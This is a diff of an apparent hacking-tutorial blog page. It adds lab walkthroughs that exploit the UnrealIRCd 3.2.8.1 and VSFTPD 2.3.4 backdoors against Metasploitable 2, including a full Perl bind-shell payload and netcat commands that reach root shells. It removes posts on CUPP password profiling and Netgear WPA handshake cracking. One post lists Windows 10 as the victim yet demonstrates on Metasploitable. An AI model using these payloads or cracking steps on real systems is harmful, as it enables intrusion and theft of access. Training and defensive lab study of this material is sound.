@@ -14,6 +14,115 @@
 <div id="description">Hacking tutorials + info</div>
 </div></div></div>
 <div id="divbody"><div class="content">
+<h3><a class="ablack" href="unrealircd-3281-backdoor-command-execution.html">
+UnrealIRCD 3.2.8.1 Backdoor Command Execution
+</a></h3>
+<!-- bashblog_timestamp: #201607021911.59# -->
+<div class="subtitle">July 02, 2016 &mdash; 
+metalkey
+</div>
+<!-- text begin -->
+<strong>Attacker:</strong> Kali Linux<br>
+<strong>Victim:</strong> Metasploitable 2<br>
+<br>
+Unreal IRCD 3.2.8.1 contains a backdoor that is triggered by entering <strong>AB;</strong> upon connecting. The backdoor was present in the Unreal3.2.8.1.tar.gz archive between November 2009 and June 12th 2010.<br>
+<br>
+The following example demonstrates it’s use on Metasploitable 2 (192.168.1.142).<br></p>
+
+<h2>Generating the Payload</h2>
+
+<p>We’re going to generate a unix bind shell with msfvenom (port 4444) and connect to this with Netcat.
+<code></p>
+
+<div class="code">
+root@kali:~$ <com>msfvenom -p cmd/unix/bind_perl --payload-options</com><br>
+root@kali:~$ <com>msfvenom -p cmd/unix/bind_perl LHOST=192.168.1.142</com><br>
+No platform was selected, choosing Msf::Module::Platform::Unix from the payload<br>
+No Arch selected, selecting Arch: cmd from the payload<br>
+No encoder or badchars specified, outputting raw payload<br>
+Payload size: 240 bytes<br>
+<b>perl -MIO -e '$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(){if($_=~ /(.*)/){system $1;}};'</b><br>
+</div>
+
+<p></code></p>
+
+<h2>Triggering the Exploit</h2>
+
+<p><code></p>
+
+<div class="code">
+root@kali:~$ <com>nc -vn 192.168.1.142 6667</com><br>
+(UNKNOWN) [192.168.1.142] 6667 (ircd) open<br>
+:irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...<br>
+:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead<br>
+<com>AB;perl -MIO -e '$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(){if($_=~ /(.*)/){system $1;}};'</com><br>
+:irc.Metasploitable.LAN 451 AB;perl :You have not registered
+</div>
+
+<p></code></p>
+
+<h2>Connecting to the Netcat Bind Shell</h2>
+
+<p><code></p>
+
+<div class="code">
+root@kali:~$ <com>nc -vn 192.168.1.142 4444</com><br>
+(UNKNOWN) [192.168.1.142] 4444 (?) open<br>
+<com>python -c "import pty;pty.spawn('/bin/bash')"</com><br>
+root@metasploitable:/etc/unreal#
+</div>
+
+<p></code></p>
+
+<p>Tags: <a href='tag_backdoors.html'>backdoors</a></p>
+<!-- text end -->
+<h3><a class="ablack" href="vsftpd-v234-backdoor-command-execution.html">
+VSFTPD v2.3.4 Backdoor Command Execution
+</a></h3>
+<!-- bashblog_timestamp: #201607021905.03# -->
+<div class="subtitle">July 02, 2016 &mdash; 
+metalkey
+</div>
+<!-- text begin -->
+<strong>Attacker:</strong> Kali Linux<br>
+<strong>Victim:</strong> Windows 10<br>
+<br>
+VSFTPD v2.3.4 contains a backdoor that is triggered by entering <strong>anystring:)</strong> as the username (no password required). After the backdoor is triggered, the target machine opens a shell on port 6200.<br>
+<br>
+This example demonstrates it’s use on Metasploitable 2 (192.168.1.142).</p>
+
+<h2>Triggering the Backdoor</h2>
+
+<p><code></p>
+
+<div class="code">
+root@kali:~$ <com>ftp 192.168.1.142</com><br>
+Connected to 192.168.1.142.<br>
+220 (vsFTPd 2.3.4)<br>
+Name (192.168.1.142:root):<com>123456:)</com><br>
+331 Please specify the password.<br>
+Password: [Enter]<br>
+[CTRL+C]<br>
+421 Service not available, remote server has closed connection
+</div>
+
+<p></code></p>
+
+<h2>Connecting to the Shell</h2>
+
+<p><code></p>
+
+<div class="code">
+root@kali:~$ <com>nc -vn 192.168.1.142 6200</com><br>
+(UNKNOWN) [192.168.1.142] 6200 (?) open<br>
+<com>python -c "import pty;pty.spawn('/bin/bash')"</com><br>
+root@metasploitable:/#
+</div>
+
+<p></code></p>
+
+<p>Tags: <a href='tag_backdoors.html'>backdoors</a></p>
+<!-- text end -->
 <h3><a class="ablack" href="linux-kernel-26-udev-lt-141---local-privilege-escalation-exploit-example.html">
 Linux Kernel 2.6 UDEV &lt; 141 – Local Privilege Escalation Exploit Example
 </a></h3>
@@ -550,183 +659,6 @@ Mode Size Type Last modified Name<br>
 <p>Uninstall flashplayer.</p>
 
 <p>Tags: <a href='tag_metasploit.html'>metasploit</a></p>
-<!-- text end -->
-<h3><a class="ablack" href="password-profiling-amp-wordlist-generation-with-cupp-common-user-password-profiler.html">
-Password Profiling &amp; Wordlist Generation with CUPP (Common User Password Profiler)
-</a></h3>
-<!-- bashblog_timestamp: #201607011503.26# -->
-<div class="subtitle">July 01, 2016 &mdash; 
-metalkey
-</div>
-<!-- text begin -->
-
-<p><strong>OS:</strong> Debian 8<br>
-<br>
-CUPP was created by Muris Kurgas (aka j0rgan) from remote-exploit (<a href="http://remote-exploit.org/">http://remote-exploit.org/</a>) and is an excellent tool for password profiling and wordlist optimization.</p>
-
-<h2>Installation</h2>
-
-<p>To install, simply clone the git repo.
-<code></p>
-
-<div class="code">
-user@debian8:~$ <com>git clone https://github.com/Mebus/cupp.git</com><br>
-user@debian8:~$ <com>./cupp.py</com><br>
-<br>
-<com>-i</com> Interactive questions for user password profiling<br>
-<com>-w</com> Use this option to improve existing dictionary, or WyD.pl output to make some pwnsauce<br>
-<com>-l</com> Download huge wordlists from repository<br>
-<com>-a</com> Parse default usernames and passwords directly from Alecto DB. Project Alecto uses purified databases of Phenoelit and CIRT which where merged and enhanced.<br>
-</div>
-
-<p></code></p>
-
-<h2>Password Profiling</h2>
-
-<p>In this example we will password profile the user "John Smith".<br>
-We have some basic information on this user and will fill out the appropriate fields.<br>
-<code></p>
-
-<div class="code">
-user@debian8:~$ <com>./cupp.py -i</com><br>
-<br>
-[+] Insert the informations about the victim to make a dictionary<br>
-[+] If you don't know all the info, just hit enter when asked! ;)<br>
-<br>
-> First Name: <com>John</com><br>
-> Surname: <com>Smith</com><br>
-> Nickname: <com>John</com><br>
-> Birthdate (DDMMYYYY): <com>12011955</com><br>
-<br>
-> Partners) name: <com>Mary</com><br>
-> Partners) nickname: <com>Mary</com><br>
-> Partners) birthdate (DDMMYYYY): <com>01031955</com><br>
-<br>
-> Child's name: <com>Mark</com><br>
-> Child's nickname: <com>Mark</com><br>
-> Child's birthdate (DDMMYYYY): <com>01011982</com><br>
-<br>
-> Pet's name: <com>Tim</com><br>
-> Company name: <com>Amazon</com><br>
-<br>
-> Do you want to add some key words about the victim? Y/[N]: <com>y</com><br>
-> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: <com>chelsea,football,beer,beatles</com><br>
-> Do you want to add special chars at the end of words? Y/[N]: <com>y</com><br>
-> Do you want to add some random numbers at the end of words? Y/[N]<com>y</com><br>
-> Leet mode? (i.e. leet = 1337) Y/[N]: <com>y</com><br>
-<br>
-[+] Now making a dictionary...<br>
-[+] Sorting list and removing duplicates...<br>
-[+] Saving dictionary to john.txt, counting 40248 words.<br>
-[+] Now load your pistolero with john.txt and shoot! Good luck! <br>
-</div>
-
-<p></code>
-Our 40,248 line wordlist has been generated and saved as "john.txt"
-<code></p>
-
-<div class="code">
-user@debian8:~$ <com>more john.txt</com><br>
-<br>
-...<br>
-395503<br>
-39551955<br>
-39551955<br>
-395555<br>
-...<br>
-4m420n<br>
-4m420n!<br>
-4m420n!!<br>
-4m420n!!!<br>
-...<br>
-B33r1955355<br>
-B33r195555<br>
-B33r1955551<br>
-B33r1955552<br>
-...<br>
-Ch3l5342101<br>
-Ch3l5342112<br>
-Ch3l534212<br>
-Ch3l5342121<br>
-...<br>
-j0hnSm17h48<br>
-j0hnSm17h49<br>
-j0hnSm17h5<br>
-j0hnSm17h50<br>
-...<br>
-</div>
-
-<p></code>
-This wordlist may prove useful when cracking hashes, capture files, etc…<br>
-You can also download wordlists and improve wordlists using the -w, -l and -a options.<br></p>
-
-<p>Tags: <a href='tag_password.html'>password</a></p>
-<!-- text end -->
-<h3><a class="ablack" href="netgear-wireless-router-default-passphrase-vulnerability.html">
-Netgear Wireless Router Default Passphrase Vulnerability
-</a></h3>
-<!-- bashblog_timestamp: #201607011502.09# -->
-<div class="subtitle">July 01, 2016 &mdash; 
-metalkey
-</div>
-<!-- text begin -->
-
-<p><strong>OS:</strong> Debian 8</p>
-
-<p>A vulnerability exists in the default passphrase for Netgear Wireless Routers. The default passphrase consists of two words, followed by a three digit number (<a href="http://support1.gearguy.com/useruploads/images/19915v3.PNG">http://support1.gearguy.com/useruploads/images/19915v3.PNG</a>):<br>
-<strong>word1word2xxx</strong></p>
-
-<p>To exploit this vulnerability you will need “aircrack-ng”, “pyrit” and the wordlist containing all possible passphrases. Initially, i was going to generate the dictionary using /usr/share/dict/cracklib-small and “crunch”, but the Netgear dictionary is already available for download from ScriptKitty (<a href="http://www.scriptkitty.ca/index.php/wordlists/">http://www.scriptkitty.ca/index.php/wordlists/</a>).</p>
-
-<h2>Installation of Required Software</h2>
-
-<p>Manual step-by-step instructions @ blackMORE Ops (<a href="http://www.blackmoreops.com/2014/03/13/install-nvidia-driver-kernel-module-cuda-and-pyrit-kali-linux/">http://www.blackmoreops.com/2014/03/13/install-nvidia-driver-kernel-module-cuda-and-pyrit-kali-linux/</a>)
-<code></p>
-
-<div class="code">
-user@debian8:~$ <com>sudo apt-get install aircrack-ng</com><br>
-user@debian8:~$ <com>sudo apt-get install pyrit</com>
-</div>
-
-<p></code></p>
-
-<h2>Step 1 – Capturing the Handshake</h2>
-
-<p>Plug in your Alfa AWUS036H and capture the 4-way handshake.<br>
-Tutorial @ SecurityTube - <a href="http://www.securitytube.net/groups?operation=view&amp;groupId=9">http://www.securitytube.net/groups?operation=view&amp;groupId=9</a>
-<code></p>
-
-<div class="code">
-user@debian8:~$ <com>airmon-ng start wlan0</com><br>
-user@debian8:~$ <com>airodump-ng mon0</com><br>
-user@debian8:~$ <com>airodump-ng -c 1 -w netgear.cap --bssid 00:11:22:33:44:55 mon0</com><br>
-</div>
-
-<p></code></p>
-
-<h2>Step 2 – Cracking the Capture</h2>
-
-<p>Confirm you have useable handshakes, then clean up the capture file and crack the passphrase.<br>
-<code></p>
-
-<div class="code">
-user@debian8:~$ <com>pyrit -r netgear.cap analyze</com><br>
-user@debian8:~$ <com>pyrit -r netgear.cap -o stripped-netgear.cap strip</com><br>
-user@debian8:~$ <com>pyrit -r stripped-netgear.cap -i adjective_noun_3d.txt -b 00:11:22:33:44:55 attack_passthrough</com><br>
-...<br>
-Parsing file 'stripped-netgear.cap' (1/1)...<br>
-Parsed 10 packets (10 802.11-packets), got 1 AP(s)<br>
-Tried 12235614 PMKs so far; 25683 PMKs per second.<br>
-The password is <com>'magicalsquash835'</com><br>
-</div>
-
-<p></code></p>
-
-<h2>Solution</h2>
-
-<p>Never use the default passphrase provided with your router and always use complex passwords that do not follow predictable patterns.</p>
-
-<p>Tags: <a href='tag_wifi.html'>wifi</a></p>
 <!-- text end -->
 <div id="all_posts"><a href="all_posts.html">View more posts</a> &mdash; <a href="all_tags.html">All tags</a> &mdash; <a href="feed.rss">Subscribe</a></div>
 </div>
